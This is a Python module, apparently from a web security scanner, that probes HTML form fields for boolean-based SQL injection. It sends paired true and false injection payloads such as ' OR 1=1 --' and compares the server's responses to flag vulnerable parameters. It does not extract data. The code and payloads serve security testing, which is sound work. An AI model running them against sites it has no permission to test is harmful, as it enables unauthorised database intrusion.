import requests
from colorama import Fore, Style
from urllib.parse import urljoin
from utils import write_to_file


def send_request(url, data, method):
    """
    Helper function to send HTTP requests.
    """
    try:
        if method.lower() == "post":
            return requests.post(url, data=data)
        elif method.lower() == "get":
            return requests.get(url, params=data)
        else:
            print(f"{Fore.RED}[!] {method} is not allowed{Style.RESET_ALL}")
            return None
    except requests.RequestException as e:
        print(f"{Fore.RED}[!] Error during request: {e}{Style.RESET_ALL}")
    return None


def test_response(data, form_data, url, method, payload, false_payload, input_tag):
    """
    This function is used to test the response of the server.
    """
    vulnerable = False
    if input_tag["name"]:
        data[input_tag["name"]] = f"1{payload}"
    action_url = (
        urljoin(url, form_data["action"])
        if form_data["action"] and form_data["action"] != "#"
        else url
    )
    response = send_request(
        action_url, data, method
    )
    if response is None:
        print(f"{Fore.RED}[!] False response is missing. Cannot proceed.{Style.RESET_ALL}")
        return False
    if input_tag["name"]:
        data[input_tag["name"]] = f"1{false_payload}"
    false_response = send_request(
        action_url, data, method
    )
    if false_response is None:
        print(f"{Fore.RED}[!] False response is missing. Cannot proceed.{Style.RESET_ALL}")
        return False
    if response.text != false_response.text:
        vulnerable = True
    return vulnerable


def boolean_based(form_data, url, method, output_file):
    """
    This function is used to perform boolean based SQL injection.
    """
    true_payloads = [
        " OR LENGTH(DATABASE())>0 --",
        " OR EXISTS(SELECT 1 FROM information_schema.tables) --",
        " OR EXISTS(SELECT 1 FROM information_schema.tables) AND 1=1 --",
        " OR 1=1 --",
    ]
    false_payloads = [
        " OR LENGTH(DATABASE())<0 --",
        " OR NOT EXISTS(SELECT 1 FROM information_schema.tables) --",
        " OR EXISTS(SELECT 1 FROM information_schema.tables) AND 1=0 --",
        " OR 1=0 --",
    ]
    print(f"{Fore.LIGHTYELLOW_EX}[*] Performing boolean based SQL injection...{Style.RESET_ALL}")
    write_to_file(
        output_file,
        f"[*] Performing boolean based SQL Injection..."
    )
    for payload, false_payload in zip(true_payloads, false_payloads):
        for input_tag in form_data["inputs"]:
            if input_tag["type"] == "submit":
                continue
            data = {}
            for tag in form_data["inputs"]:
                if tag["type"] == "hidden" or tag["value"]:
                    data[tag["name"]] = tag["value"]
                elif tag["type"] != "submit":
                    data[tag["name"]] = "test"
            if test_response(data, form_data, url, method, payload, false_payload, input_tag):
                print(f"{Fore.LIGHTGREEN_EX}[+] The parameter {input_tag['name']} is vulnerable to boolean based SQL injection.{Style.RESET_ALL}")
                write_to_file(
                    output_file,
                    f"[+] {url} - Boolean-based SQLi vulnerability found"
                )
                return True
            else:
                print(f"{Fore.LIGHTRED_EX}[-] The parameter {input_tag['name']} is not vulnerable to boolean based SQL injection.{Style.RESET_ALL}")
    write_to_file(
        output_file,
        f"[-] No SQLi vulnerabilities found using Boolean-Based SQLi"
    )
    print(f"{Fore.LIGHTRED_EX}[-] No SQLi vulnerabilities found using Boolean-Based SQLi")
    return False
